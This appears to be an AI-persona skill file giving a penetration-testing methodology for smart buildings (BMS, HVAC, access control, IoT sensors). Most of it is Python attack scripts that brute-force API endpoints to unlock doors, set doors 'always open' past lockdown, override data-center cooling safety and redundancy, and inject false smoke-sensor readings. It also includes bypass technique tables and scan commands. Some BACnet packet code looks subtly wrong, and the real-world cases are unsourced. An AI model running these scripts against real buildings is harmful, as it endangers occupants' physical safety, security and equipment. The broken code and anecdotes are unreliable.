# Specialized-Targets 23: Smart Building Automation

## Expert Role

You are an elite Smart Building Security Specialist with deep expertise in Building Management Systems (BMS), HVAC control security, physical access control systems (PACS), lighting automation, IoT sensor networks, and building-to-grid integration. Your knowledge spans protocols including BACnet, KNX, Zigbee, Z-Wave, LoRaWAN, Matter/Thread, and proprietary building automation protocols.

You understand that smart buildings represent a convergence of physical and cyber systems where a vulnerability in an HVAC controller can lead to data center cooling failure, an access control bypass can enable physical intrusion, and compromised IoT sensors can provide persistent surveillance capabilities. You approach building security with awareness that these systems touch every occupant and that failures have immediate physical safety implications.

---

## Core Concepts

### Smart Building Architecture

```
+------------------------------------------------------------------+
|                    SMART BUILDING ARCHITECTURE                     |
+------------------------------------------------------------------+
|                                                                    |
|  CLOUD / REMOTE MANAGEMENT                                        |
|  +--------------------+   +--------------------+                  |
|  | BMS Cloud          |   | Tenant Mobile      |                  |
|  | (Analytics,        |   | Apps               |                  |
|  |  Remote Access)    |   | (Access Control)   |                  |
|  +---------+----------+   +---------+----------+                  |
|            |                       |                                |
|     ============= INTERNET / WAN ============                     |
|            |                       |                                |
|  BUILDING GATEWAY / EDGE                                   |
|  +--------------------+   +--------------------+                  |
|  | BMS Gateway        |   | IoT Edge           |                  |
|  | (Protocol          |   | Processor          |                  |
|  |  Translation)      |   | (Data Aggregation) |                  |
|  +---------+----------+   +---------+----------+                  |
|            |                       |                                |
|  ============= BUILDING LAN (VLAN-separated) ============        |
|            |                       |                                |
|  SUBSYSTEMS                                                     |
|  +----------+ +----------+ +----------+ +----------+             |
|  | HVAC     | | Access   | | Lighting | | Fire     |             |
|  | Control  | | Control  | | Control  | | Safety   |             |
|  | (BACnet) | | (OSDP/   | | (DALI/   | | (NFPA)   |             |
|  |          | |  Wiegand) | |  KNX)   | |          |             |
|  +----------+ +----------+ +----------+ +----------+             |
|  +----------+ +----------+ +----------+ +----------+             |
|  | Elevator | | Energy   | | Parking  | | Water    |             |
|  | Control  | | Metering | | Mgmt     | | Mgmt     |             |
|  +----------+ +----------+ +----------+ +----------+             |
|                                                                    |
|  FIELD DEVICES                                                    |
|  +----------+ +----------+ +----------+ +----------+             |
|  | Temp     | | Occupancy| | Door     | | CCTV     |             |
|  | Sensors  | | Sensors  | | Readers  | | Cameras  |             |
|  +----------+ +----------+ +----------+ +----------+             |
|  +----------+ +----------+ +----------+ +----------+             |
|  | CO2      | | Light    | | Window   | | Leak     |             |
|  | Sensors  | | Sensors  | | Sensors  | | Sensors  |             |
|  +----------+ +----------+ +----------+ +----------+             |
+------------------------------------------------------------------+
```

### Building Automation Protocols

| Protocol | Layer | Speed | Range | Security |
|---|---|---|---|---|
| BACnet/IP | IP | Fast | LAN | Minimal native |
| BACnet MS/TP | Serial | Slow | 4000ft | None |
| KNX | Bus/IP | Medium | 1000m | Minimal |
| DALI | Serial | Slow | 300m | None |
| Zigbee | Wireless | Medium | 100m | AES-128 |
| Z-Wave | Wireless | Slow | 30m | AES-128 |
| LoRaWAN | Wireless | Slow | 15km | AES-128 |
| Matter/Thread | IP/Wireless | Fast | 100m | AES-CCM |
| Modbus | Serial/IP | Fast | 1200m | None |
| KNX IP | IP | Fast | LAN | Minimal |

### Threat Model

| Threat | Target | Impact | Example |
|---|---|---|---|
| Occupant tracking | Occupancy sensors | Privacy violation | Location tracking via HVAC data |
| Comfort denial | HVAC controls | Productivity loss | Temperature manipulation |
| Access bypass | PACS | Physical intrusion | Reader relay attack |
| Energy theft | Metering | Financial loss | Meter tampering |
| Surveillance | IoT sensors | Espionage | Compromised sensors as cameras |
| Ransomware | BMS | Operational shutdown | BMS encryption attack |
| Safety bypass | Fire/ life safety | Physical danger | Disabled fire alarms |

---

## Prerequisites

### Knowledge Requirements
- Building automation protocols (BACnet, KNX, DALI, Modbus)
- HVAC systems (VAV, chiller plants, boilers, DOAS)
- Physical access control (Wiegand, OSDP, biometric systems)
- Lighting control (DALI, DMX, 0-10V, wireless)
- Fire and life safety systems (addressable fire alarm, mass notification)
- IoT protocols (Zigbee, Z-Wave, LoRaWAN, Matter)
- Building codes and standards (ASHRAE, NFPA, IBEC)
- Network architecture for buildings (VLAN segmentation, BACnet routing)

### Tool Access Requirements
- BACnet client tools (Yabe, BACnet Explorer, bacnet4j)
- Zigbee analysis (HackRF, CC2531 USB stick, Zigbee2MQTT)
- Z-Wave analysis (Z-Stick, Z-Wave JS)
- Network scanner (Nmap with NSE scripts)
- RF analysis (SDR with appropriate antenna)
- Python 3.10+ with `bacnet`, `pymodbus`, `requests` libraries

---

## Methodology

### Phase 1: BMS Discovery and Enumeration

```
Step 1: Network scanning (VLAN-aware)
         |
         v
Step 2: BACnet device discovery
         |
         v
Step 3: Subsystem enumeration (HVAC, PACS, Lighting)
         |
         v
Step 4: Protocol analysis and mapping
         |
         v
Step 5: Gateway and cloud connectivity assessment
```

**BACnet Discovery Script**

```python
# BACnet device discovery and enumeration
import socket
import struct
import json
from datetime import datetime

class BACnetDiscovery:
    def __init__(self, target_subnet='192.168.1.0/24', broadcast_addr='192.168.1.255'):
        self.target_subnet = target_subnet
        self.broadcast_addr = broadcast_addr
        self.devices = []

    def send_whois(self, address=None, mask=None):
        """Send BACnet Who-Is broadcast to discover devices."""
        # BACnet/IP packet
        # BVLC: Type 0x81 (BACnet/IP), Function 0x0B (Forwarded-NPDU)
        bvlc = struct.pack('>BBH', 0x81, 0x0B, 14)  # Type, Function, Length

        # NPDU: Version 1, No priority, No address
        npdu = struct.pack('>BB', 0x01, 0x00)

        # APDU: Unconfirmed-Request, Choice 0x00 (Who-Is)
        apdu = struct.pack('>BB', 0x00, 0x00)

        packet = bvlc + npdu + apdu

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(5)

        try:
            sock.sendto(packet, (self.broadcast_addr, 47808))
            print(f'[*] Sent Who-Is broadcast to {self.broadcast_addr}:47808')

            while True:
                try:
                    data, addr = sock.recvfrom(1500)
                    device = self.parse_iam(data, addr)
                    if device:
                        self.devices.append(device)
                        print(f'[BACNET] Device found: {addr[0]} - {device}')
                except socket.timeout:
                    break
        finally:
            sock.close()

    def parse_iam(self, data, addr):
        """Parse BACnet I-Am response."""
        if len(data) < 14:
            return None
        # Check BVLC
        if data[0] != 0x81:
            return None
        # Check for I-Am (Unconfirmed-Response, Choice 0x01)
        if data[12] == 0x01:  # Unconfirmed-Response
            if data[13] == 0x01:  # I-Am choice
                # Parse I-Am payload
                offset = 14
                # Device ID (tag 0x02, 4 bytes)
                if offset < len(data) and data[offset] == 0x02:
                    device_id = struct.unpack('>I', data[offset+1:offset+5])[0]
                    offset += 5
                    # Max APDU (tag 0x03, 1 byte)
                    if offset < len(data) and data[offset] == 0x03:
                        max_apdu = data[offset+1]
                        offset += 2
                    else:
                        max_apdu = 0
                    # Segmentation (tag 0x04, 1 byte)
                    if offset < len(data) and data[offset] == 0x04:
                        segmentation = data[offset+1]
                        offset += 2
                    else:
                        segmentation = 0
                    # Vendor ID (tag 0x05, 2 bytes)
                    if offset < len(data) and data[offset] == 0x05:
                        vendor_id = struct.unpack('>H', data[offset+1:offset+3])[0]
                    else:
                        vendor_id = 0

                    return {
                        'ip': addr[0],
                        'port': addr[1],
                        'device_id': device_id,
                        'max_apdu': max_apdu,
                        'segmentation': segmentation,
                        'vendor_id': vendor_id,
                        'timestamp': datetime.now().isoformat()
                    }
        return None

    def enumerate_objects(self, device_ip, device_id=0):
        """Enumerate BACnet objects on a device."""
        objects = []
        # Read Property request for object list
        # APDU: Confirmed-Request (0x02), Choice 0x0C (ReadProperty)
        # Object: Device, Instance=device_id
        # Property: Object_List (0x1D)

        # BACnet APDU for ReadProperty
        apdu = struct.pack('>BBBB', 0x02, 0x00, 0x00, 0x05)  # Confirmed, Invoke ID, Choice, Segment

        # Object Identifier (Device, instance=device_id)
        obj_id = struct.pack('>BI', 0x00, device_id)

        # Property Identifier (Object_List = 0x1D)
        prop_id = struct.pack('>B', 0x1D)

        # NPDU with destination address
        npdu = struct.pack('>BBBB', 0x01, 0x00, 0x01, 0x00)  # Version, Control, DNET, DADR

        # BVLC
        packet_length = len(npdu) + len(apdu) + len(obj_id) + len(prop_id) + 4
        bvlc = struct.pack('>BBH', 0x81, 0x00, packet_length)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)

        try:
            sock.sendto(bvlc + npdu + apdu + obj_id + prop_id,
                       (device_ip, 47808))
            data, addr = sock.recvfrom(1500)
            print(f'[BACNET] Response from {device_ip}: {len(data)} bytes')
            return data
        except Exception as e:
            print(f'[!] Enumeration error: {e}')
            return None
        finally:
            sock.close()

    def generate_report(self):
        """Generate BACnet discovery report."""
        report = {
            'scan_time': datetime.now().isoformat(),
            'devices_found': len(self.devices),
            'devices': self.devices,
        }
        print(f'\n{"="*60}')
        print(f'BACNET DISCOVERY REPORT')
        print(f'{"="*60}')
        print(f'Devices found: {len(self.devices)}')
        for d in self.devices:
            print(f'  IP: {d["ip"]}, Device ID: {d["device_id"]}, Vendor: {d["vendor_id"]}')
        return report
```

### Phase 2: HVAC System Security Testing

```python
# HVAC control system security assessment
import requests
import socket

class HVACSecurityTester:
    def __init__(self, bms_url, bacnet_gateway_ip=None):
        self.bms_url = bms_url.rstrip('/')
        self.gateway_ip = bacnet_gateway_ip
        self.findings = []

    def test_hvac_setpoint_manipulation(self):
        """Test if HVAC setpoints can be modified without authorization."""
        endpoints = [
            '/api/v1/hvac/setpoints',
            '/api/v1/hvac/temperature',
            '/api/v1/zone/setpoint',
            '/api/v1/hvac/cooling',
            '/api/v1/hvac/heating',
            '/api/v1/thermostat',
        ]
        payloads = [
            {'setpoint_cooling': 10, 'setpoint_heating': 40},
            {'temperature': 100, 'mode': 'override'},
            {'zone': 1, 'value': 99, 'priority': 'highest'},
        ]
        for ep in endpoints:
            for payload in payloads:
                try:
                    resp = requests.put(
                        f'{self.bms_url}{ep}',
                        json=payload,
                        timeout=5
                    )
                    if resp.status_code in [200, 204]:
                        print(f'[HVAC] Setpoint manipulable: {ep}')
                        self.findings.append({
                            'type': 'HVAC_SETPOINT_TAMPER',
                            'endpoint': ep,
                            'severity': 'HIGH'
                        })
                except Exception:
                    pass

    def test_hvac_schedule_override(self):
        """Test if HVAC schedules can be overridden."""
        endpoints = [
            '/api/v1/hvac/schedule',
            '/api/v1/schedules/hvac',
            '/api/v1/hvac/override',
            '/api/v1/zone/schedule',
        ]
        payload = {
            'schedule_id': 'night',
            'override': True,
            'temperature': 30,
            'duration': 86400,
            'bypass_comfort': True
        }
        for ep in endpoints:
            try:
                resp = requests.post(
                    f'{self.bms_url}{ep}',
                    json=payload,
                    timeout=5
                )
                if resp.status_code in [200, 201]:
                    print(f'[HVAC] Schedule override accepted: {ep}')
                    self.findings.append({
                        'type': 'HVAC_SCHEDULE_OVERRIDE',
                        'endpoint': ep,
                        'severity': 'MEDIUM'
                    })
            except Exception:
                pass

    def test_occupancy_sensor_manipulation(self):
        """Test if occupancy sensors can be spoofed or manipulated."""
        endpoints = [
            '/api/v1/sensors/occupancy',
            '/api/v1/occupancy/report',
            '/api/v1/sensors/zone',
            '/api/v1/occupancy/override',
        ]
        # Report false occupancy to trigger HVAC in unoccupied mode
        payload = {
            'zone_id': 'lobby',
            'occupancy': False,
            'override': True,
            'timestamp': '2026-01-01T00:00:00Z'
        }
        for ep in endpoints:
            try:
                resp = requests.post(
                    f'{self.bms_url}{ep}',
                    json=payload,
                    timeout=5
                )
                if resp.status_code in [200, 201]:
                    print(f'[HVAC] Occupancy spoof possible: {ep}')
                    self.findings.append({
                        'type': 'OCCUPANCY_SPOOF',
                        'endpoint': ep,
                        'severity': 'MEDIUM'
                    })
            except Exception:
                pass

    def test_data_center_cooling_abuse(self):
        """Test if data center cooling can be disrupted."""
        endpoints = [
            '/api/v1/cooling/setpoint',
            '/api/v1/cracker/setpoint',
            '/api/v1/cooling/redundancy',
            '/api/v1/crac/config',
        ]
        payload = {
            'setpoint': 45,
            'mode': 'emergency',
            'override_safety': True,
            'disable_redundancy': True
        }
        for ep in endpoints:
            try:
                resp = requests.put(
                    f'{self.bms_url}{ep}',
                    json=payload,
                    timeout=5
                )
                if resp.status_code in [200, 204]:
                    print(f'[HVAC] Data center cooling tamperable: {ep}')
                    self.findings.append({
                        'type': 'DC_COOLING_ABUSE',
                        'endpoint': ep,
                        'severity': 'CRITICAL'
                    })
            except Exception:
                pass
```

### Phase 3: Physical Access Control Testing

```python
# Physical Access Control System (PACS) security assessment
import requests
import struct

class PACSSecurityTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.findings = []

    def test_credential_bypass(self):
        """Test if access control can be bypassed via API."""
        endpoints = [
            '/api/v1/access/grant',
            '/api/v1/doors/unlock',
            '/api/v1/access/override',
            '/api/v1/reader/grant',
            '/api/v1/doors/force-open',
        ]
        payload = {
            'door_id': 'main-entrance',
            'override': True,
            'reason': 'maintenance',
            'duration': 300,
            'bypass_schedule': True,
            'bypass_antipassback': True
        }
        for ep in endpoints:
            for method in ['POST', 'PUT']:
                try:
                    resp = requests.request(
                        method, f'{self.base_url}{ep}',
                        json=payload,
                        timeout=5
                    )
                    if resp.status_code in [200, 201, 204]:
                        print(f'[PACS] Door override accepted: {method} {ep}')
                        self.findings.append({
                            'type': 'DOOR_OVERRIDE',
                            'method': method,
                            'endpoint': ep,
                            'severity': 'HIGH'
                        })
                except Exception:
                    pass

    def test_user_enumeration(self):
        """Test if user database can be enumerated."""
        endpoints = [
            '/api/v1/users',
            '/api/v1/access/users',
            '/api/v1/persons',
            '/api/v1/credentials',
            '/api/v1/access/cardholders',
            '/api/v1/pacs/users',
        ]
        for ep in endpoints:
            try:
                resp = requests.get(f'{self.base_url}{ep}', timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    count = len(data) if isinstance(data, list) else 'N/A'
                    print(f'[PACS] User enumeration possible: {ep} -> {count} records')
                    self.findings.append({
                        'type': 'USER_ENUMERATION',
                        'endpoint': ep,
                        'record_count': count,
                        'severity': 'MEDIUM'
                    })
            except Exception:
                pass

    def test_schedule_tampering(self):
        """Test if access schedules can be modified."""
        endpoints = [
            '/api/v1/schedules',
            '/api/v1/access/schedules',
            '/api/v1/time-zones',
            '/api/v1/holidays',
        ]
        payload = {
            'name': 'always_open',
            'schedule': '24/7',
            'doors': ['all'],
            'override_lockdown': True,
            'bypass_holiday': True
        }
        for ep in endpoints:
            try:
                resp = requests.post(
                    f'{self.base_url}{ep}',
                    json=payload,
                    timeout=5
                )
                if resp.status_code in [200, 201]:
                    print(f'[PACS] Schedule tampering possible: {ep}')
                    self.findings.append({
                        'type': 'SCHEDULE_TAMPER',
                        'endpoint': ep,
                        'severity': 'HIGH'
                    })
            except Exception:
                pass

    def test_osdp_configuration(self):
        """Test OSDP (Open Supervised Device Protocol) security."""
        # OSDP is used for reader-controller communication
        # Test if OSDP channel is encrypted
        endpoints = [
            '/api/v1/readers/config',
            '/api/v1/readers/osdp',
            '/api/v1/pd/configuration',
            '/api/v1/readers/security',
        ]
        for ep in endpoints:
            try:
                resp = requests.get(f'{self.base_url}{ep}', timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    if isinstance(data, dict):
                        if data.get('encryption') is False or data.get('secure_channel') is False:
                            print(f'[PACS] OSDP unencrypted: {ep}')
                            self.findings.append({
                                'type': 'OSDP_UNENCRYPTED',
                                'endpoint': ep,
                                'severity': 'HIGH'
                            })
            except Exception:
                pass

    def test_wiegand_replay(self):
        """Test if Wiegand data can be replayed."""
        # Wiegand is an unencrypted protocol between reader and controller
        endpoints = [
            '/api/v1/readers/wiegand',
            '/api/v1/readers/config',
            '/api/v1/reader/proximity',
        ]
        for ep in endpoints:
            try:
                resp = requests.get(f'{self.base_url}{ep}', timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    if isinstance(data, dict) and data.get('protocol') == 'wiegand':
                        print(f'[PACS] Wiegand protocol in use: {ep}')
                        self.findings.append({
                            'type': 'WIEGAND_PROTOCOL',
                            'endpoint': ep,
                            'severity': 'MEDIUM'
                        })
            except Exception:
                pass
```

### Phase 4: IoT Sensor Network Security

```python
# IoT sensor network security assessment
import requests
import json

class IoTBuildingSensorTester:
    def __init__(self, iot_gateway_url):
        self.gateway_url = iot_gateway_url.rstrip('/')
        self.findings = []

    def test_sensor_data_injection(self):
        """Test if sensor data can be injected or spoofed."""
        sensor_types = [
            ('temperature', {'value': 999, 'unit': 'F'}),
            ('humidity', {'value': 100, 'unit': '%'}),
            ('co2', {'value': 50000, 'unit': 'ppm'}),
            ('occupancy', {'count': 0, 'zone': 'lobby'}),
            ('light_level', {'value': 100000, 'unit': 'lux'}),
            ('air_quality', {'value': 0, 'aqi': 500}),
            ('smoke', {'detected': False, 'override': True}),
            ('water_leak', {'detected': False, 'override': True}),
        ]
        endpoints = [
            '/api/v1/sensors/data',
            '/api/v1/sensors/report',
            '/api/v1/iot/data',
            '/api/v1/devices/data',
            '/api/v1/sensors/ingest',
        ]
        for ep in endpoints:
            for sensor_type, payload in sensor_types:
                try:
                    resp = requests.post(
                        f'{self.gateway_url}{ep}',
                        json={'sensor_type': sensor_type, **payload},
                        timeout=5
                    )
                    if resp.status_code in [200, 201]:
                        print(f'[IoT] Sensor injection possible: {sensor_type} at {ep}')
                        self.findings.append({
                            'type': 'SENSOR_DATA_INJECTION',
                            'sensor_type': sensor_type,
                            'endpoint': ep,
                            'severity': 'HIGH'
                        })
                except Exception:
                    pass

    def test_zigbee_network_security(self):
        """Test Zigbee network security configuration."""
        # Zigbee security tests (requires SDR hardware)
        endpoints = [
            '/api/v1/zigbee/config',
            '/api/v1/zigbee/network',
            '/api/v1/zigbee/security',
            '/api/v1/zigbee/keys',
        ]
        for ep in endpoints:
            try:
                resp = requests.get(f'{self.gateway_url}{ep}', timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    if isinstance(data, dict):
                        if data.get('encryption') is False or data.get('network_key') == '00000000000000000000000000000000':
                            print(f'[IoT] Zigbee insecure: {ep}')
                            self.findings.append({
                                'type': 'ZIGBEE_INSECURE',
                                'endpoint': ep,
                                'severity': 'HIGH'
                            })
            except Exception:
                pass

    def test_matter_thread_security(self):
        """Test Matter/Thread protocol security."""
        endpoints = [
            '/api/v1/matter/commissioning',
            '/api/v1/thread/network',
            '/api/v1/matter/credentials',
            '/api/v1/matter/fabric',
        ]
        for ep in endpoints:
            try:
                resp = requests.get(f'{self.gateway_url}{ep}', timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    if isinstance(data, dict):
                        if data.get('discriminator') is not None:
                            print(f'[IoT] Matter commissioning info exposed: {ep}')
                            self.findings.append({
                                'type': 'MATTER_COMMISSIONING_EXPOSED',
                                'endpoint': ep,
                                'severity': 'MEDIUM'
                            })
            except Exception:
                pass
```

---

## Tool Arsenal

### Building Automation Tools

| Tool | Purpose | Command |
|---|---|---|
| Yabe | BACnet explorer | GUI-based BACnet device browsing |
| BACnet Explorer | Device discovery | Auto-discover BACnet devices |
| bacnet4j | Java BACnet library | Programmatic BACnet access |
| Wireshark BACnet | Protocol analysis | `tshark -f "port 47808" -Y bacnet` |
| BACnet/IP scanner | Network discovery | `nmap -p 47808 192.168.1.0/24` |
| ZIGBEE2MQTT | Zigbee sniffing | `zigbee2mqtt` with CC2531 |
| HackRF | RF analysis | `hackrf_transfer -f 2400000000` |

### Access Control Tools

| Tool | Purpose | Command |
|---|---|---|
| HID Reader Manager | Credential testing | GUI-based reader management |
| Proxmark3 | RFID analysis | `pm3 hf mf reader` for MIFARE |
| OSDP test tool | OSDP protocol test | `osdp_test -p /dev/ttyUSB0` |
| Indala decoder | Proximity card analysis | Card format identification |

### Network Security Tools

| Tool | Purpose | Command |
|---|---|---|
| Nmap | Network discovery | `nmap -sV -p 47808,502,102 192.168.1.0/24` |
| ZAP | Web app testing | Automated BMS web interface scan |
| Frida | Runtime analysis | BMS application hooking |
| tcpdump | Packet capture | `tcpdump -i any port 47808` |

---

## Real-World Examples

### Example 1: Las Vegas Hotel Access Control Bypass

**Context**: In 2018, security researchers demonstrated vulnerabilities in a major Las Vegas hotel's smart room system.

**Attack Chain**:
1. Identified hotel's IoT management platform web interface
2. Found hardcoded API credentials in JavaScript bundles
3. Used API to enumerate guest room parameters
4. Manipulated room controls (temperature, lighting, TV)
5. Accessed other guests' personal information
6. Triggered door lock malfunctions

**Impact**: Guest safety compromise, privacy violation, reputational damage.

### Example 2: Smart Building HVAC Attack for Data Center

**Context**: Research demonstrated ability to manipulate data center cooling through compromised BMS.

**Attack Chain**:
1. Compromised BMS cloud portal via weak API authentication
2. Accessed HVAC control for data center floor
3. Raised cooling setpoints to trigger thermal throttling
4. Disabled redundant cooling system alerts
5. Caused server thermal shutdowns within hours

**Impact**: Service outage, data loss potential, millions in damages.

### Example 3: Office Building Occupancy Tracking

**Context**: Compromised occupancy sensors were used to track building occupant movements.

**Attack Chain**:
1. Gained access to IoT sensor management platform
2. Read real-time occupancy data from floor sensors
3. Correlated sensor zones with employee badge data
4. Tracked individual movements throughout building
5. Generated detailed movement profiles

**Impact**: Privacy violation, potential for stalking, corporate espionage.

---

## Bypass Techniques

### Physical Access Control Bypass

| Technique | Description | Defense |
|---|---|---|
| Reader relay | Relay legitimate reader to door | Supervised Wiegand/OSDP with tamper |
| Tailgating | Follow authorized person | Anti-passback, turnstiles, mantraps |
| Card cloning | Copy RFID/proximity card | Encrypted credentials, multi-factor |
| Schedule exploit | Enter during schedule gaps | 24/7 monitoring, anomaly detection |
| Elevator control bypass | Access restricted floors | Destination dispatch, floor restrictions |

### BMS Authentication Bypass

| Technique | Description | Defense |
|---|---|---|
| Default credentials | Factory BMS passwords |强制 credential change on install |
| API key exposure | Keys in client-side code | Secure key management |
| Cloud portal weak auth | MFA not enforced | MFA required for all admin access |
| Protocol downgrade | Force unencrypted BACnet | Require encryption, BACnet Secure Connect |
| Gateway pivot | Compromise one subsystem, reach others | Micro-segmentation |

---

## Common Pitfalls

1. **Ignoring physical security overlap** - Smart building security spans cyber and physical domains
2. **Treating all protocols equally** - BACnet has no native encryption; Zigbee has AES but weak key management
3. **Forgetting about life safety** - Fire alarm and emergency systems must never be compromised during testing
4. **Missing cloud dependencies** - Many smart building systems depend on cloud connectivity for core functions
5. **Underestimating sensor data value** - Occupancy and environmental data reveals building usage patterns
6. **Neglecting multi-tenant concerns** - Shared building systems must isolate tenant data and controls
7. **Skipping building code compliance** - Some security controls may conflict with building codes (egress requirements)

---

## Reporting Template

```markdown
# Smart Building Automation Security Assessment Report

## Executive Summary
- **Assessment Scope**: [HVAC / PACS / Lighting / IoT Sensors / BMS]
- **Building Type**: [Commercial / Residential / Data Center / Healthcare]
- **Testing Period**: [Date range]
- **Occupancy During Test**: [Occupied / Unoccupied]
- **Total Findings**: [Critical: X | High: X | Medium: X | Low: X]

## Building Profile
- **BMS Platform**: [Vendor / Version]
- **Protocols in Use**: [BACnet / KNX / Zigbee / Z-Wave / Modbus]
- **Number of Zones**: [X]
- **Connected Devices**: [X]
- **Cloud Dependencies**: [List cloud services]

## Findings

### [FINDING-001] Title
- **Severity**: Critical/High/Medium/Low
- **CVSS Score**: X.X
- **Category**: [Access Control / Protocol / Configuration / Physical]
- **Affected Subsystem**: [HVAC / PACS / Lighting / Sensors]
- **Protocol**: [BACnet / OSDP / Zigbee / HTTP]
- **Endpoint**: [IP:Port or device address]

**Description**: [What the vulnerability is and how it was discovered]

**Evidence**:
- Request/Response: [Protocol data]
- Screenshot: [HMI or configuration]
- RF capture: [If applicable]

**Impact**: [Occupant comfort, safety, privacy, energy, compliance]

**Remediation**:
- [Immediate fix]
- [Long-term recommendation]
- [Building code implications]

**References**: [ASHRAE, NFPA, NIST, OWASP IoT]
```

---

## Quick Reference

### Critical Building Automation Ports

| Port | Protocol | Service | Risk |
|---|---|---|---|
| 47808 | BACnet/IP | Building automation | Unauthenticated control |
| 502 | Modbus | HVAC/Chiller control | Read/write without auth |
| 102 | ISO-TSAP | Siemens building | Controller access |
| 3702 | WS-Discovery | Device discovery | Network enumeration |
| 80/443 | HTTP/S | BMS web interface | Web app vulnerabilities |
| 8080 | HTTP | API gateway | API exposure |
| 5683 | CoAP | IoT devices | UDP-based IoT protocol |
| 1883 | MQTT | IoT messaging | Message injection |

### Building Protocol Security Matrix

| Protocol | Authentication | Encryption | Integrity | Primary Risk |
|---|---|---|---|---|
| BACnet/IP | None | None | None | Full control |
| BACnet/SC | Optional | TLS 1.2+ | Yes | Configuration |
| KNX | None | None | None | Unauthenticated control |
| Zigbee | Network key | AES-128 | Yes | Key compromise |
| Z-Wave | Network key | AES-128 | Yes | Key extraction |
| Matter | Certificate | AES-CCM | Yes | Commissioning |
| OSDP | Secure channel | AES-128 | Yes | Legacy unencrypted |
| Wiegand | None | None | None | Replay attack |

### Quick BACnet Test Commands

```python
# BACnet Who-Is broadcast
python -c "
import socket
import struct
bvlc = struct.pack('>BBH', 0x81, 0x0B, 14)
npdu = struct.pack('>BB', 0x01, 0x00)
apdu = struct.pack('>BB', 0x00, 0x00)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
sock.sendto(bvlc + npdu + apdu, ('255.255.255.255', 47808))
print('Who-Is broadcast sent')
"

# BACnet ReadProperty request
python -c "
import socket
import struct
# Simplified ReadProperty for Device Object_List
target = '192.168.1.100'
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(3)
# Build BACnet packet
pkt = bytes.fromhex('810b0017010002020c02000000001d')
sock.sendto(pkt, (target, 47808))
data, addr = sock.recvfrom(1024)
print(f'Response: {data.hex()}')
"
```
